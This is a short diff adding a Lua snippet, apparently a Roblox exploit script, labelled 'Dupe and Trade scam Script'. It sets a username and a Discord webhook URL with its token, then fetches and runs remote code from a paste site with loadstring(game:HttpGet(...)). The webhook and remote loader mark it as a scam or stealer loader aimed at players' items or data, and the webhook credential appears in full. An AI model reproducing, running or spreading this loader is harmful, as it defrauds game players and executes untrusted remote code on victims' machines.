@@ -1,0 +1,5 @@
+_G.UserName = “kerbyLangM”
+_G.Webhook = “https://discord.com/api/webhooks/1077218788950417408/4SrJv8l5-FsYv-pERva4x0a8SD43PXVzadoOxk4h_jjo0klvNixD5KxF-IJb6nPoYlTc”
+_G.ScriptName = “Dupe and Trade scam Script”
+
+loadstring(game:HttpGet('https://paste.xyzo.space/psx/new.lua', true))()
